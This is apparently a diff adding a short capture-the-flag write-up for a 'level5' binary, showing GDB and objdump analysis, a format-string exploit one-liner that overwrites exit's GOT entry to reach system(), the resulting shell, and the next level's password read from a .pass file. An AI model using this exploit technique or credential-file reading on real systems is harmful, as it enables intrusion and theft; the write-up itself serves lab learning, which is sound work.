@@ -1,0 +1,18 @@
+Step 1: Analyze binary with GDB
+$ gdb ./level5
+(gdb) info functions        # Found n(), o(), main()
+(gdb) disassemble n         # Found format string vulnerability + exit()
+(gdb) disassemble o         # Found system() call - win condition
+
+Step 2: Find GOT entry
+$ objdump -R level5
+Found exit@GOT at 0x08049838
+
+Step 3: Create GOT overwrite exploit
+$ (python -c 'print "\x38\x98\x04\x08" + "%134513824u%4$n"'; cat) | ./level5
+
+Step 4: Got shell and retrieved password
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
